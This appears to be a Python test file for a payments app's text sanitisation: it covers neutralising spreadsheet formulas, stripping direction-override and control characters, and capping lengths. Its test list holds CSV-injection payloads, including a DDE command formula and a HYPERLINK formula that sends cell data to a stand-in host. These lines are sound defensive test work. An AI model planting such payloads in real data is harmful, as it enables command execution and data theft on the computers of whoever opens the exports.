"""Text that arrives from outside and is read somewhere else.

The famous injections are already handled: the ORM parameterises, React
escapes, and the HTML that is meant to be HTML goes through bleach. These cover
the quieter kind, where the text is stored and displayed perfectly correctly
and causes harm in a third place.
"""
import pytest

from nkenzapay.analytics.exports import to_csv, to_xlsx
from nkenzapay.common.text import clean_block, clean_line, spreadsheet_safe

pytestmark = pytest.mark.django_db


# --- the spreadsheet one, which is the one that costs money -----------------


@pytest.mark.parametrize(
    "attack",
    [
        '=cmd|\'/c calc\'!A0',
        '=HYPERLINK("http://evil.test?"&A1,"Click")',
        "+1+1",
        "-1+1",
        "@SUM(A1:A9)",
        "\t=1+1",
    ],
)
def test_a_name_cannot_become_a_formula(attack):
    """A customer can call themselves anything, and it is only a name until
    the desk exports the table and opens it in Excel."""
    assert spreadsheet_safe(attack).startswith("'")


def test_ordinary_text_is_left_alone():
    for ordinary in ["Marie Nkenganyi", "marie@example.com", "NKP-2026-1", "100000"]:
        assert spreadsheet_safe(ordinary) == ordinary


def test_the_export_neutralises_it_in_both_formats():
    sheets = {"users": [["Email", "Legal name"],
                        ["a@b.test", '=HYPERLINK("http://evil.test","hi")']]}

    csv_bytes = to_csv(sheets)
    assert b"'=HYPERLINK" in csv_bytes
    # Not the bare formula: a leading = is what makes the cell run.
    assert b',=HYPERLINK' not in csv_bytes

    # The Excel path builds through the same row cleaner.
    assert to_xlsx(sheets)


# --- control characters, which survive every escape ------------------------


def test_a_direction_override_cannot_hide_inside_a_name():
    """A right-to-left override makes text read differently from what it is,
    on the screen where somebody compares a name to a document."""
    assert "‮" not in clean_line("Marie‮Nkenganyi")
    assert clean_line("Marie​Nkenganyi") == "MarieNkenganyi"


def test_whitespace_is_tidied_rather_than_trusted():
    assert clean_line("  Marie   Claire  ") == "Marie Claire"
    assert clean_line("Marie\tClaire") == "Marie Claire"
    assert clean_line(None) == ""


def test_a_message_keeps_its_line_breaks():
    """Somebody typed them on purpose. Nobody typed the null byte."""
    cleaned = clean_block("Hello\n\nI paid\x00 today")
    assert cleaned == "Hello\n\nI paid today"


def test_runs_of_blank_lines_collapse():
    assert clean_block("One\n\n\n\n\nTwo") == "One\n\nTwo"


def test_lengths_are_capped():
    assert len(clean_line("a" * 500, limit=80)) == 80
    assert len(clean_block("a" * 500, limit=100)) == 100


# --- and the same rules where they are actually applied ---------------------


def test_a_profile_name_is_cleaned_on_the_way_in(customer, db):
    from nkenzapay.accounts.serializers import ProfileSerializer

    form = ProfileSerializer(
        customer.profile,
        data={"first_name": "  Marie‮  ", "last_name": "Nkenganyi"},
        partial=True,
        context={"request": type("R", (), {"user": customer})()},
    )
    assert form.is_valid(), form.errors
    assert form.validated_data["first_name"] == "Marie"


def test_a_message_body_is_cleaned_on_the_way_in(receive_order, customer):
    from nkenzapay.transactions import services

    message = services.post_message(
        reference=receive_order.reference, sender=customer,
        body="I have\x07 paid​ now",
    )
    assert message.body == "I have paid now"
